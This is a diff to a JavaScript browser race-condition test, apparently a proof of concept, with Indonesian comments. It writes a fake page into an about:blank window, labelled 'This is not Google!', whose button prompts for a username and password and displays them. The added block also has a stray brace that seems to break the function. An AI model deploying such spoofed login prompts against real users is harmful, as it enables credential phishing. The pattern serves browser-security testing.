@@ -120,15 +120,22 @@ function runRaceTest() {
 
   log("Window baru dibuka sebagai about:blank.");
 
-  // Step 1: mulai navigasi ke final.html
-  setTimeout(() => {
-    try {
-      win.location.href = "about:blank";
-      log("Navigasi ke final.html dimulai.");
-    } catch (e) {
-      log("Gagal mengatur location ke final.html: " + e);
-    }
-  }, delayNav);
+        setTimeout(() => {
+          try {
+            win.document.write(`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
 
   // Step 2: coba document.write setelah navigasi dimulai
   setTimeout(() => {
